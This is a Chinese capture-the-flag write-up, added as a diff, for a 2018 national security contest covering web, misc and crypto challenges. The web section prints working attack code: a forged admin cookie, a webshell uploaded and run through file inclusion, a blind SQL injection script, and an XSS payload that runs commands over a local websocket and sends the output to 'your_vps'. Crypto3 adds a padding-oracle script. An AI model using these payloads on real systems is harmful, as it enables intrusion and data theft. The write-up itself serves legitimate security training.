@@ -1,0 +1,1250 @@
+# 2018全国网络空间安全技术大赛web&misc&crypto题解
+
+阅读量 **460041**
+
+|评论 **11**
+
+|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)
+
+发布时间 : 2018-05-14 13:58:17
+
+ **x**
+
+##### 译文声明
+
+本文是翻译文章
+
+译文仅供参考，具体内容表达以及含义原文为准。
+
+![](https://p1.ssl.qhimg.com/t01db482c95ee5ca397.jpg)
+
+## 前言
+
+周末抽空做了一下2018全国网络空间安全技术大赛，由于题目难度适中，ak了web，做出了绝大部分的misc和crypto  
+这里特别感谢队友yuriXO对我crypto的极大帮助:)  
+crypto和misc的题目地址
+
+    
+    
+    链接: <https://pan.baidu.com/s/1FSIIbldbBHLNsUFJOaJ8lA> 密码: 91v6
+    
+
+## WEB
+
+###  web签到
+
+签到题就不解释了  
+flag如下
+
+    
+    
+    flag{ylng_ying_yin@}
+    
+
+###  web1
+
+<http://117.34.117.216>  
+访问后跳转到登录页面  
+<http://117.34.117.216/login.php>  
+发现有注册，随意注册一个账号，登录后  
+  
+发现要以admin的身份访问flag.php  
+查看源代码，发现还有change_password的功能  
+  
+同时发现cookie中有username项  
+  
+猜想可能存在越权问题  
+进入修改密码页面  
+  
+发现未做username的check  
+猜想直接使用了cookie中的username  
+随机修改cookie中的username为admin  
+同时修改密码  
+成功登入，来到管理页面  
+  
+发现可以获取远程图片  
+随手测试,发现题目会将远程访问到的页面内容写到本地的图片img目录中  
+尝试访问  
+<http://127.0.0.1/flag.php>  
+下载图片文件后获得flag  
+  
+得到flag
+
+    
+    
+    flag{dbf6e52d69973dd16d87d4a8c3816ca9}
+    
+
+###  web2
+
+访问题目
+
+    
+    
+    [http://117.34.116.192/index.php?file=login.html
+    ](http://117.34.116.192/index.php?file=login.html)
+
+  
+登录尝试发现是伪登录  
+随即想到存在文件包含，尝试读取源码
+
+    
+    
+    file=php://filter/read=convert.base64-encode/resource=index.php
+
+提示
+
+    
+    
+    illgal filename!!
+    
+
+发现存在过滤  
+随手测试了一波目录，发现了.git文件泄露  
+  
+随后下载到源码  
+  
+此时打开index.php  
+  
+发现是经过加密的  
+这里有两种解密选择
+
+    
+    
+    <http://www.phpjm.cc/>
+    <https://github.com/firebroo/screw_decode>
+
+前者花钱解密，简单快捷  
+后者用工具解密，相对于繁琐一些  
+解密后得到源码
+
+    
+    
+    <?php
+        error_reporting(0);
+        if(!isset($_GET['file'])||empty($_GET['file'])){
+             header('Refresh:1,url=index.php?file=login.html');
+             die;
+        }
+        $file  = $_GET['file'];
+    
+        if ((strpos($file,':')!==false)){
+            header('Refresh:1,url=index.php?file=login.html');
+            echo "illgal filename!!";
+            die;
+        }
+        include_once($file);
+    ?>
+    
+
+发现只是文件包含  
+再看upload.php
+
+    
+    
+    <?php
+        function Administrator($value){
+            if(empty($_COOKIE['in_adminid']) || empty($_COOKIE['in_adminexpire']) || $_COOKIE['in_adminexpire']!==md5($_COOKIE['in_adminid'].$_COOKIE['in_adminname'].$_COOKIE['in_adminpassword'].$_COOKIE['in_permission'])){
+                return False;
+            }
+            setcookie("in_adminexpire",$_COOKIE['in_adminexpire'],time()+1800);
+            if(!empty($_COOKIE['in_permission'])){
+                $array=explode(",",$_COOKIE['in_permission']);
+                $adminlogined=false;
+                for($i=0;$i<count($array);$i++){
+                    if($array[$i]==$value){$adminlogined=true;}
+                }
+                if(!$adminlogined){
+                    return False;
+                }
+            }else{
+                return False;
+            }
+            return true;
+        }
+        if (Administrator(2)){
+            if(isset($_FILES['file'])){
+                $filename = './img/img'.rand().'.jpg';
+                move_uploaded_file($_FILES["file"]["tmp_name"],$filename);
+                header('Refresh:3,url=index.php?file=upload.php');
+                echo "Upload $filename Success!";
+                die;
+            }
+        }else{
+            header('Refresh:3,url=index.php?file=login.html');
+            echo "Who are you!";
+            die;
+        }
+    ?>
+    
+
+发现可以文件包含，但是要绕过前面的
+
+    
+    
+    if(empty($_COOKIE['in_adminid']) || empty($_COOKIE['in_adminexpire']) || $_COOKIE['in_adminexpire']!==md5($_COOKIE['in_adminid'].$_COOKIE['in_adminname'].$_COOKIE['in_adminpassword'].$_COOKIE['in_permission']))
+    
+
+随即构造脚本
+
+    
+    
+    import hashlib
+    
+    def md5(a):
+        b = hashlib.md5(a).hexdigest()
+        return b
+    in_adminid='1'
+    in_adminname='admin'
+    in_adminpassword='admin'
+    in_permission='2'
+    in_adminexpire=md5(in_adminid+in_adminname+in_adminpassword+in_permission)
+    print in_adminexpire
+    
+
+利用cookieedit更改cookie，即可来到上传页面  
+  
+上传一个带shell的jpg图片  
+  
+得到文件位置
+
+    
+    
+    Upload ./img/img9545545.jpg Success!
+    
+
+然后利用文件包含
+
+    
+    
+    http://117.34.116.192/index.php?file=./img/img9545545.jpg
+    
+
+菜刀连接上  
+  
+下载f14g.php  
+发现依旧是加密过的，还是用上述方法解密  
+即可得到flag
+
+    
+    
+    <?php
+      $flag = "";//flag{7cb3d823105433606ccac8fb75aed67c}
+    ?>
+    
+
+###  web3
+
+<http://45.76.49.10:8001>  
+挺有意思的一题，题目应该来源一个真实事件
+
+    
+    
+    从钓鱼样本到某大厂存储型XSS
+    [https://xz.aliyun.com/t/2322
+    ](https://xz.aliyun.com/t/2322)
+
+用PC点开链接会直接跳转到正版的QQ空间  
+所以这里需要抓包，不难发现跳转到
+
+    
+    
+    http://45.76.49.10:8001/0b10813e85c20b58a023440d9f58d7e2
+    
+
+然后发现内容(过多，给出部分)
+
+    
+    
+    document.write(decodeURIComponent(arcfour("36a9dc5d29d54b46793d0c682298dbab",base64_decode("EzOR925j1QH2xcQc8Tr9x4GfY2UQ/pt8qa6HxeqOo2WBlyxX36pUO4BZcYkzAbOBWHIVSQiE5fH+LMw4MB/kAFyW7hlMZEWJSoJ7agQOOE3G8GWZuKepUs7z4bia/iXPIPicedfmKpk7VIC+axY+HKCwxCCN9jTJo5kC9d8KTGR/xLgz1a1/7I1cBFdwcuuYPtlHcWjDagXWwN0z25MJgq4ZDViT+x+YkilDwwwzOvqesH/LleYn9PMnE00QvrijCo99j/HAvmMPEVJGDADMt+zowRvcQHeehw/ATQ8/K0vOaqqxf4P1uZKDNOnFDTlt6ijtyuGFTrVHQfru3pErTsEoHOrjHj6sHyBA0xZEC1j3wVM4kW1OKZWYBhRNqHUvcz6Tc7tdjwmkqcaEW71NTXxBF4D8zjJoe8qJeGXvo8qSpWJV/4tYLHI3x90dNV9T53CqeyNYmYE995ozzaN8Wwjqt+YthltVTfqBTkE43HX64V0F3Itqvx0QRtzKWjdxwtc5IibTqjuL0JDlrsHLzOIv51qGH9JvgqrE5Y9jZhQoICCUIlgbyKoYuQJvN8Z2yArywMsY4iiU1jG5lI+BvaYS2BK6INwtRdLKYlDn80yKkq3XPFRsloM1KfxS9DQ/a5euUOf/LB91m72PG4p5GRH+kl/fW9OAdJWoXeA4tJpKntxrGonGfS4QAk8ne5JrHCJHqAKHVuyEqeYhHimkhB9bUtDaZJBG8kDwKaiT7cjCHaxJouLo9S5lVGPIUlIQNusMaLAvC6SaIDk4iY50uXdR2mVBouB+g+/pCbK5oTYvxnqrljqti9McqPNGk5AeLPKZzH
+    .....
+    
+
+是加密后的内容  
+在密文最后可以发现解密函数
+
+    
+    
+    document.title = 'u624bu673au7edfu4e00u767bu5f55';
+    document.body.appendChild(set);
+    function base64_encode(d){var q='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';var z,y,x,w,v,u,t,s,i=0,j=0,p='',r=[];if(!d){return d}do{z=d.charCodeAt(i++);y=d.charCodeAt(i++);x=d.charCodeAt(i++);s=z<<16|y<<8|x;w=s>>18&0x3f;v=s>>12&0x3f;u=s>>6&0x3f;t=s&0x3f;r[j++]=q.charAt(w)+q.charAt(v)+q.charAt(u)+q.charAt(t)}while(i<d.length);p=r.join('');var r=d.length%3;return(r?p.slice(0,r-3):p)+'==='.slice(r||3)}
+    function base64_decode(d){var q='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';var z,y,x,w,v,u,t,s,i=0,j=0,r=[];if(!d){return d}d+='';do{w=q.indexOf(d.charAt(i++));v=q.indexOf(d.charAt(i++));u=q.indexOf(d.charAt(i++));t=q.indexOf(d.charAt(i++));s=w<<18|v<<12|u<<6|t;z=s>>16&0xff;y=s>>8&0xff;x=s&0xff;if(u==64){r[j++]=String.fromCharCode(z)}else if(t==64){r[j++]=String.fromCharCode(z,y)}else{r[j++]=String.fromCharCode(z,y,x)}}while(i<d.length);return r.join('')}
+    function arcfour(k,d){var o='';s=new Array();var n=256;l=k.length;for(var i=0;i<n;i++){s[i]=i}for(var j=i=0;i<n;i++){j=(j+s[i]+k.charCodeAt(i%l))%n;var x=s[i];s[i]=s[j];s[j]=x}for(var i=j=y=0;y<d.length;y++){i=(i+1)%n;j=(j+s[i])%n;x=s[i];s[i]=s[j];s[j]=x;o+=String.fromCharCode(d.charCodeAt(y)^s[(s[i]+s[j])%n])}return o}
+    
+
+不难看出，作者自己写了rc4算法和base64加解密  
+而密文流程为：  
+base64解密->rc4解密->url解码  
+我这里直接选择控制台解密  
+利用console.log和出题人定义好的解密函数，容易直接得到明文代码,由于代码篇幅过长，想看这部分伪造钓鱼代码的，可以看之前文章提及的先知上的一篇文章，我这里只给出部分重要js代码
+
+    
+    
+    <script>
+          var key = "MiaoMiao";
+          var times = 0;
+          function error(msg) {
+            $("#error_tips").css({
+              display: 'block'
+            });
+            $('#error_message').html(msg);
+            err = true;
+          }
+          $('form input').focus(function() {
+            $("#error_tips").css({
+              display: 'none'
+            });
+            err = false;
+          });
+          $("#error_tips").on('click',
+          function() {
+            $(this).hide();
+          });
+          $("#go").on('click',
+            function() {
+            var $this = $(this);
+            err = false;
+            var p = $("#p").val();
+            var u = $("#u").val();
+            u == '' && error('您还没有输入帐号！');
+            if (err) return false;
+            p == '' && error("您还没有输入密码！");
+            if (err) return false;
+            /^[1-9][0-9]{5,9}$/.test(u) || error('请输入正确的帐号！');
+            if (err) return false;
+            var len = p.length; (len < 6 || len > 16) && error('您输入的帐号或密码不正确，请重新输入。');
+            if (err) {
+              $("#p").val('');
+              return false;
+            }
+            if (!err){
+                $.ajax({
+                    url:'/f701fee85540b78d08cb276d14953d58',
+                    type:'POST',
+                    dataType:'json',
+                    data: "data="+encodeURIComponent(encryptByDES($('#loginform').serialize(),key)),
+                    error:function(er){
+                        window.location.href='https://qzone.qq.com';
+                    }
+                })
+            }
+          })
+    
+          function encryptByDES(message, key) {
+                var keyHex = CryptoJS.enc.Utf8.parse(key);
+                var encrypted = CryptoJS.DES.encrypt(message, keyHex, {
+                    mode: CryptoJS.mode.ECB,
+                    padding: CryptoJS.pad.Pkcs7
+                });
+            return encrypted.ciphertext.toString(CryptoJS.enc.Base64);
+        }
+      </script>
+    
+
+我们不难看到，黑客获取到用户登录的账号密码后，进行了序列化，然后利用DES加密后post到了后端/f701fee85540b78d08cb276d14953d58  
+其中DES的密钥为MiaoMiao  
+现在容易得到思路：  
+由于该网站是一个钓鱼网站，那么势必会存储用户登录的账号密码  
+那么既然要存储，可能就会涉及Sql注入问题。既然是钓鱼网站的sql操作  
+我相信不会有太多的过滤吧(毕竟我相信钓鱼的人不会这么XD)  
+所以我的第一反应就是insert注入，测试后可以发现，无论post什么数据  
+网页均无反馈，看起来就是sleep盲注了  
+于是我构造出测试脚本(注：这里需要注意传输数据得用key加密)
+
+    
+    
+    from pyDes import *
+    import base64
+    import requests
+    import string
+    url = "http://45.76.49.10:8001/f701fee85540b78d08cb276d14953d58"
+    payload ="1' and if((ascii(substr((database()),1,1))>-1),sleep(10),1) or '"
+    pay = "ip=0.0.0.0&hrUW3PG7mp3RLd3dJu=12345678900&LxMzAX2jog9Bpjs07jP=%s"%payload
+    k = des("MiaoMiao", ECB, "", pad=None, padmode=PAD_PKCS5)
+    d = base64.b64encode(k.encrypt(pay))
+    data = {
+        "data":d
+    }
+    print pay
+    print data
+    try:
+        s =requests.post(url=url,data=data,timeout=5)
+        print s.content
+    except:
+        print "sleep 10s ok!"
+    
+
+发现可以成功sleep，于是我立刻写出了注入脚本
+
+    
+    
+    from pyDes import *
+    import base64
+    import requests
+    import string
+    url = "http://45.76.49.10:8001/f701fee85540b78d08cb276d14953d58"
+    flag = ""
+    for i in range(1,50):
+        print i
+        for j in '1234567890abcdef{}':
+            j = ord(j)
+            payload = "1' and if((ascii(substr((select password from admin limit 0,1),%s,1))=%s),sleep(3),1) or '"%(i,j)
+            pay = "ip=0.0.0.0&hrUW3PG7mp3RLd3dJu=%s&LxMzAX2jog9Bpjs07jP=123456789" % (payload)
+            k = des("MiaoMiao", ECB, "", pad=None, padmode=PAD_PKCS5)
+            d = base64.b64encode(k.encrypt(pay))
+            data = {
+                "data": d
+            }
+            try:
+                s = requests.post(url=url, data=data,timeout=3)
+            except:
+                flag += chr(j)
+                print flag
+                break
+    
+
+最后可以得到flag
+
+    
+    
+    flag{73ad1744f38b68ece51076c7ac77621b}
+    
+
+###  web4
+
+<http://117.34.112.247:8001>  
+题目的背景为xss->rce  
+同时给出了部分代码
+
+    
+    
+    type msg struct {
+        Cmd string `json:"cmd"`
+    }
+    
+    func main() {
+        app := sweetygo.New("./", nil)
+        app.GET("/ws", ws)
+        app.RunServer(":8002")
+    }
+    
+    func ws(ctx *sweetygo.Context) {
+        conn, _ := websocket.Upgrade(ctx.Resp, ctx.Req, ctx.Resp.Header(), 1024, 1024)
+        for {
+            m := msg{}
+            err := conn.ReadJSON(&m)
+            if err != nil {
+                fmt.Println("Error reading json.", err)
+                break
+            }
+    
+            res := exec(m.Cmd)
+            fmt.Println(res)
+            if err = conn.WriteJSON(res); err != nil {
+                fmt.Println(err)
+                break
+            }
+        }
+    }
+    
+
+不难看出作者使用了go web框架sweetygo  
+帮作者推广一波
+
+    
+    
+    github.com/AmyangXYZ/sweetygo
+    
+
+这里看应该不存在漏洞的，然后就容易联想到醒目题目描述
+
+    
+    
+    “grollia的websocket真好用，一句话 conn, _ := websocket.Upgrade(ctx.Resp, ctx.Req, ctx.Resp.Header(), 1024, 1024)就建好了，我也可以搭个IGo NoteBook啦！”
+    —— 刚学Golang的小明
+    
+
+这里容易联想到websocket的问题  
+我们看到代码
+
+    
+    
+    func main() {
+        app := sweetygo.New("./", nil)
+        app.GET("/ws", ws)
+        app.RunServer(":8002")
+    }
+    
+
+首先探测了一下，发现8002端口并没有对外网开放  
+我们只能通过内部访问，而唯一的方式就是xss  
+而我们知道js可以连接websocket  
+同时注意到
+
+    
+    
+    func ws(ctx *sweetygo.Context) {
+        conn, _ := websocket.Upgrade(ctx.Resp, ctx.Req, ctx.Resp.Header(), 1024, 1024)
+        for {
+            m := msg{}
+            err := conn.ReadJSON(&m)
+            if err != nil {
+                fmt.Println("Error reading json.", err)
+                break
+            }
+    
+            res := exec(m.Cmd)
+            fmt.Println(res)
+            if err = conn.WriteJSON(res); err != nil {
+                fmt.Println(err)
+                break
+            }
+        }
+    }
+    
+
+这里存在命令执行(但是出题人为了安全，只允许执行ls和cat)  
+可以看到，如果我们连接上websocket,传输msg即可造成rce  
+所以现在的思路比较清晰了  
+1.构造xss，利用js连接websocket  
+2.连接后发送RCE命令(ls)  
+3.将数据打出到自己的vps  
+查阅资料可以发现
+
+    
+    
+    onmessage:一个用于消息事件的事件监听器，这一事件当有消息到达的时候该事件会触发。这个Listener会被传入一个名为"message"的 MessageEvent 对象。
+    
+    onopen:一个用于连接打开事件的事件监听器。当readyState的值变为 OPEN 的时候会触发该事件。该事件表明这个连接已经准备好接受和发送数据。这个监听器会接受一个名为"open"的事件对象。
+    
+
+我们先写出xss进行探测，看是否可以成功连接
+
+    
+    
+    <script>
+    var ws = new WebSocket("ws://127.0.0.1:8002/ws");
+    ws.onopen = function(){
+        $.ajax({
+            url: "http://your_vps/success"
+        });
+    };
+    </script>
+    
+
+不一会儿就发现收到了success数据，证明连接成功  
+于是我们构造出rce的js
+
+    
+    
+    <script>
+    var ws = new WebSocket("ws://127.0.0.1:8002/ws");
+    ws.onopen = function(){
+        var b = {"cmd":"ls"};
+        ws.send(JSON.stringify(b));
+    };
+    ws.onmessage = function(evt){
+        $.ajax({
+            url: "http://your_vps/?"+evt.data
+        });
+    }</script>
+    
+
+收到回显  
+  
+读取flag  
+  
+后来了解到此题的背景同样为真实案例：  
+IPython Notebook( CVE-2014-3429 )  
+膜一发作者~
+
+## MISC
+
+###  misc1
+
+题目打开后得到一个图片  
+发现ffd9后有压缩包  
+  
+提取出来后发现是伪加密  
+利用binwalk直接提取  
+获得文件stego.txt  
+  
+第一反应即base64隐写
+
+    
+    
+    [https://www.tr0y.wang/2017/06/14/Base64steg/](https://www.tr0y.wang/2017/06/14/Base64steg/)
+
+随即写脚本
+
+    
+    
+    # -*- coding: cp936 -*-    
+    b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
+    
+    with open('stego.txt', 'rb') as f:
+        bin_str = ''
+        for line in f.readlines():
+            stegb64 = ''.join(line.split())
+            rowb64 =  ''.join(stegb64.decode('base64').encode('base64').split())
+    
+            offset = abs(b64chars.index(stegb64.replace('=','')[-1])-b64chars.index(rowb64.replace('=','')[-1]))
+            equalnum = stegb64.count('=') #no equalnum no offset
+    
+            if equalnum:
+                bin_str += bin(offset)[2:].zfill(equalnum * 2)
+    
+            print ''.join([chr(int(bin_str[i:i + 8], 2)) for i in xrange(0, len(bin_str), 8)]) #8位一组
+    
+
+运行即可获得flag
+
+    
+    
+    Flag{Ba5e_64OFive}
+    
+
+###  misc2
+
+首先是题目描述
+
+    
+    
+    我觉得，这题可以在windows环境下解。
+    
+
+windows下解的mp3题  
+一般misc无非是隐写，windows下的隐写，容易想到ntfs  
+解压后用工具查看  
+  
+发现有flag.doc文件  
+导出后查看文件内容  
+发现有处有奇怪的空白  
+  
+我们改变一下字体颜色为红色  
+  
+但是显然是第二段的flag：`_from_your_efforts}`  
+还有一段在哪里呢？  
+用winhex或者改成txt格式查看文件末尾  
+可以发现  
+  
+另一段flag
+
+    
+    
+    f l a g { A l l _ s u c c e s s _ c o m e s
+    
+
+最后得到flag
+
+    
+    
+    flag{All_success_comes_from_your_efforts}
+    
+
+###  misc3
+
+题目有些脑洞  
+看到题目提示
+
+    
+    
+    ames发现公司员工通过数据包向外隐匿地发送信息，并截获了这段时间的流量包，请帮助他恢复流量中隐匿传输的信息，并以flag{*}的形式提交。
+    
+
+重点在于隐匿的，查看了一遍tcp和http流量，并未发现什么奇特的点  
+最后在icmp协议中发现了问题  
+  
+  
+  
+容易看到每个icmp协议中的2个字符都在变化，其余均不变，于是脑洞大开，拼接为一起，成功得到flag
+
+    
+    
+    flag{RyHgbCf5OhFEiyJnlt9c8ASP}
+    
+
+## Crypto
+
+###  crypto1
+
+题目描述
+
+    
+    
+    在RSA算法中，我们知道公钥加密指数e要与φ(n)互素。但是如果e与φ(n)不互素，我们应该怎么办呢？
+    已知条件见文本，解出明文，递交FLAG。
+    
+
+观察到e为200=8*25  
+此时我们可以用25的逆元去解，然后开8次方即可  
+脚本如下
+
+    
+    
+    import gmpy2
+    c=7797067792814175554801975939092864905908878472965854967525218347636721153564161093453344819975650594936628697646242713415817737235328825333281389820202851500260665233910426103904874575463134970160306453553794787674331367563821223358610113031883172742577264334021835304931484604571485957116313097395143177603380107508691261081725629713443494783479897404175199621026515502716868988672289887933681890547568860707175288422275073767747544353536862473367590288531216644146154729962448906402712219657000812226637887827912541098992158458173920228864293993030475885461755767069329678218760943185942331149777258713727459739405
+    p=111052706592359766492182549474994387389169491981939276489132990221393430874991652628482505832745103981784837665110819809096264457329836670397000634684595709283710756727662219358743235400779394350023790569023369287367240988429777113514012101219956479046699448481988253039282406274512111898037689623723478951613
+    q=146182161315365079136034892629243958871460254472263352847680359868694597466935352294806409849433942550149005978761759458977642785950171998444382137410141550212657953776734166481126376675282041461924529145282451064083351825934453414726557476469773468589060088164379979035597652907191236468744400214917268039573
+    e=25
+    n=p*q
+    d =gmpy2.invert(e,(p-1)*(q-1))
+    flag8 = pow(c,d,n)
+    print hex(gmpy2.iroot(flag8,8)[0])
+    
+
+即可得到
+
+    
+    
+    0x4354467b4c6966655f49535f415f4265617574797d
+    
+
+即
+
+    
+    
+    CTF{Life_IS_A_Beauty}
+    
+
+###  crypto2
+
+题目实际上ecc算法  
+参考链接
+
+    
+    
+    [https://hgarrereyn.gitbooks.io/th3g3ntl3man-ctf-writeups/2017/picoCTF_2017/problems/cryptography/ECC2/ECC2.html
+    ](https://hgarrereyn.gitbooks.io/th3g3ntl3man-ctf-writeups/2017/picoCTF_2017/problems/cryptography/ECC2/ECC2.html)
+
+使用上述链接中的代码
+
+    
+    
+    from sage.all import *
+    
+    M = 93556643250795678718734474880013829509320385402690660619699653921022012489089
+    A = 66001598144012865876674115570268990806314506711104521036747533612798434904785
+    B = 25255205054024371783896605039267101837972419055969636393425590261926131199030
+    P = (56027910981442853390816693056740903416379421186644480759538594137486160388926, 65533262933617146434438829354623658858649726233622196512439589744498050226926)
+    Q = (82470715998045253133931379369477906093551619202698188387811754055611146940802, 73706972132070004469528192666337156782673206740372495041722107956327401385152)
+    F = FiniteField(M)
+    E = EllipticCurve(F,[A,B])
+    P = E.point(P)
+    Q = E.point(Q)
+    factors, exponents = zip(*factor(E.order()))
+    primes = [factors[i] ^ exponents[i] for i in range(len(factors))][:-2]
+    dlogs = []
+    for fac in primes:
+        t = int(P.order()) / int(fac)
+        dlog = discrete_log(t*Q,t*P,operation="+")
+        dlogs += [dlog]
+        print("factor: "+str(fac)+", Discrete Log: "+str(dlog)) #calculates discrete logarithm for each prime order
+    
+    l = crt(dlogs,primes)
+    print(l)
+    
+
+可以计算k
+
+    
+    
+    factor: 4, Discrete Log: 2
+    factor: 3, Discrete Log: 2
+    factor: 5, Discrete Log: 4
+    factor: 7, Discrete Log: 1
+    factor: 137, Discrete Log: 70
+    factor: 593, Discrete Log: 459
+    factor: 24337, Discrete Log: 4079
+    factor: 25589, Discrete Log: 22677
+    factor: 3637793, Discrete Log: 192569
+    factor: 5733569, Discrete Log: 123222
+    241442528183133391090263659954
+    
+
+观察到题目的加密流程
+
+    
+    
+    def encrypt(B,flag):
+        M=[]
+        (x,y)=B
+        for i in flag:
+            M.append(str((int(i)*x)%p))
+        return M
+    
+
+我们只要求逆元乘回去即可
+
+    
+    
+    def decrypt(B,cipher):
+        M = []
+        (x, y) = B
+        d = gmpy2.invert(x,p)
+        for i in cipher:
+            M.append(str((int(i) * d) % p))
+        return M
+    
+
+最后完整解题代码
+
+    
+    
+    # -*- coding: cp936 -*-    import gmpy2
+    
+    p=93556643250795678718734474880013829509320385402690660619699653921022012489089
+    a=66001598144012865876674115570268990806314506711104521036747533612798434904785
+    b=25255205054024371783896605039267101837972419055969636393425590261926131199030
+    P=(56027910981442853390816693056740903416379421186644480759538594137486160388926, 65533262933617146434438829354623658858649726233622196512439589744498050226926)
+    def add(p,a,b,P,Q):
+        if P==(0,0):
+            return Q
+        if Q==(0,0):
+            return P
+        if P!=(0,0) and Q!=(0,0):
+            (Px,Py),(Qx,Qy)=P,Q
+            if P!=Q:
+                s=(Qy - Py) * gmpy2.invert(Qx - Px, p) % p
+            else:
+                s=(3 * Px ** 2 + a) * gmpy2.invert(2 * Py, p) % p
+            Rx=(s**2-Px-Qx)%p
+            Ry=(s*Px-s*Rx-Py)%p
+            return int(Rx),int(Ry)
+    
+    def bits(n):
+        while n:
+            yield n & 1
+            n >>=1
+    
+    def double_and_add(n,p,a,b,P):
+        Q=P
+        result=(0,0)
+        for bit in bits(n):
+            if bit==1:
+                result=add(p,a,b,result,Q)
+            Q=add(p,a,b,Q,Q)
+        return result
+    
+    def encrypt(B,flag):
+        M=[]
+        (x,y)=B
+        for i in flag:
+            M.append(str((int(i)*x)%p))
+        return M
+    
+    def decrypt(B,cipher):
+        M = []
+        (x, y) = B
+        d = gmpy2.invert(x,p)
+        for i in cipher:
+            M.append(str((int(i) * d) % p))
+        return M
+    c=['59606574942045237892160565660789485179761474793536568061197611839605420346341', '47875019928315975935470451251861629803812269197911544058574875780767887781883', '47875019928315975935470451251861629803812269197911544058574875780767887781883', '87395068884892630805602977284140888323072523242568617217106051341924998180285', '46630423195878630891974017244302408005523563020190564609208709685671882231257', '75663513871163368848912862875213032947123317646943593214483315283087465615827', '85854675293416868827320102885172653026510557702538106366457650697150744603084', '65472352448909868870505622865253412867736077591349080062508979869024186628570', '53740797435180606913815508456325557491786871995724056059886243810186654064112', '29033090675284737956938845630910624941599754626753028605274605597415583384570', '46630423195878630891974017244302408005523563020190564609208709685671882231257', '75663513871163368848912862875213032947123317646943593214483315283087465615827', '85854675293416868827320102885172653026510557702538106366457650697150744603084', '65472352448909868870505622865253412867736077591349080062508979869024186628570', '53740797435180606913815508456325557491786871995724056059886243810186654064112', '79988897786552237848975045680708725338535954904725594365146282667731978320855', '46630423195878630891974017244302408005523563020190564609208709685671882231257', '87395068884892630805602977284140888323072523242568617217106051341924998180285', '47875019928315975935470451251861629803812269197911544058574875780767887781883', '59606574942045237892160565660789485179761474793536568061197611839605420346341', '68553139631861392827071371663189883460860008671410101763805781158572693782972']
+    C1=(86892541043117403764803129862679079014029734149331061618933412161852971278663, 76398582431519045045640039001896036904727467709248934373737249884161020619730)
+    k=241442528183133391090263659954
+    kc1 = double_and_add(k,p,a,b,C1)
+    flag = decrypt(kc1,c)
+    res = ""
+    for i in flag:
+        res+=chr(int(i))
+    print res
+    
+
+运行后得到flag
+
+    
+    
+    flag{GOOD LUCK, LUCKY DOG!}
+    
+
+###  crypto3
+
+nc 117.34.112.241 1279  
+此题是一道Padding oracle attack的题目  
+详细介绍可以参照我的这篇文章
+
+    
+    
+    [http://skysec.top/2017/12/13/padding-oracle%E5%92%8Ccbc%E7%BF%BB%E8%BD%AC%E6%94%BB%E5%87%BB/
+    ](http://skysec.top/2017/12/13/padding-oracle%E5%92%8Ccbc%E7%BF%BB%E8%BD%AC%E6%94%BB%E5%87%BB/)
+
+这里我直接给出利用脚本了
+
+    
+    
+    #!/usr/bin/env python
+    # coding=utf-8
+    from pwn import *
+    result = ''
+    result1=''
+    encode = 'x03xc1x1cx98x0ex8ax75xf4x6bx04x83xebx3bx58xa1x3ax31xe8x26x08xe2x44x5exa1x05xd9xc7x86x8bxd9x75x9a'
+    encode1 = encode[0:16]
+    encode2 = encode[16:32]
+    encode3 = '123456789ABCDEFG'
+    p = remote('117.34.112.241',1279)
+    
+    p.recvuntil('crack violently!n')
+    def dd(datab):
+    
+        p.send('2n')
+        p.recvuntil("bytes ciphertextn")
+        p.sendline(encode1)
+        p.recvuntil('IVn')
+        p.sendline(datab)
+        zz = p.recvline()
+        print zz
+        if "good" in zz:
+            print 'success'
+            print datab
+            return 1
+        else:
+            print 'false'
+    jj = ''
+    xx = ''
+    for j in xrange(1,17):
+        for z in result1:
+            xx += chr(ord(z)^j)            
+        for i in xrange(0,256):
+            print i
+            ss = (15-len(result1)) * chr(0)
+            ss = ss +chr(i)+xx
+            if dd(ss):
+                wrp= chr(i^j^ord(encode3[16-j]))
+                result += wrp
+                jj = chr(ord(wrp))+jj 
+                result1 = chr(i^j) + result1
+                print jj
+                xx = ''
+                break
+    
+
+用iv和encode1得到第一段明文  
+  
+用encode1和encode2得到第二段明文  
+
+###  crypto4
+
+题目描述
+
+    
+    
+    在Alice用帐户名和密码登录一个用RSA加密通信的网站的过程中，不小心将密码的最后一位字符的大小写弄错了，于是重新输入，这一过程恰好被攻击者K监听到，并截获了这两条密文。那么攻击者就能很容易破解出Alice的密码，求出这个密码，提交FLAG。
+    
+
+可以看到加密的明文消息只有1位不同，相差32,查到一篇相关文章  
+参考链接
+
+    
+    
+    [https://github.com/ZoEplA/Team233/blob/0bb364f2aef8775230c9552d75465ef6a6aa1fb5/2018/wp/redhet/Team233%20writeup.md
+    ](https://github.com/ZoEplA/Team233/blob/0bb364f2aef8775230c9552d75465ef6a6aa1fb5/2018/wp/redhet/Team233%20writeup.md)
+
+效仿其中的代码
+
+    
+    
+    # solve.sage
+    from hashlib import sha256
+    
+    def related_message_attack(c1, c2, diff, e, n):
+        PRx.<x> = PolynomialRing(Zmod(n))
+        g1 = x^e - c1
+        g2 = (x+diff)^e - c2
+    
+        def gcd(g1, g2):
+            while g2:
+                g1, g2 = g2, g1 % g2
+            return g1.monic()
+    
+        return -gcd(g1, g2)[0]
+    
+    n = 27262030738190162906068533309218248319312037416856794814532459866130196673561833084739048171769479893806671499522643803412108279907223895517897969906253626028270289028646596897429641138913001561947557784840311014399973312098056896539904624036584153785225626096007313018814076860235378686567457599895712604364100507424939342862464483596795761725357279364545154915110900098124905389351969357103586063992040096368146580315262263546850581515833590884397726108478477798668261762306189036525841356592859315437201733146083995028221597538824801113980100295046731791678895520928441645173205511865657977068061078456941189550383
+    e = 3
+    
+    c2 = 80256065280425989347153660555632253204654757632704797390559450985825600409910703812294413750536361555897348650491697548574007864446117693097103136799284683292648287334023253488891301144881769557674366138889636475162525325855368132832237345279798028008137655682278413635753791609965810603989005785747744993045461207072415730041608172272077090225741385971
+    c1 = 80256065280425989347153660555632253204654757632704797390559450985825600409910703812294413750536361555897348650491699334745453065435184774282609871793525447798655880850590288431173204818294305809864531293135689257716648980215360552397800418527073621708108066406898267720300730094465977262440649283179655484278496374936325875186126245693549228697550672467
+    
+    diff = 32
+    m = related_message_attack(c2, c1, diff, e, n)
+    flag = ('%x' % m).decode('hex')
+    print flag
+    
+
+得到flag
+
+    
+    
+    my password is: I_Lov5_RSA_Rel6te7_me8sagE_aTTacK
+    
+
+## Re
+
+###  re1
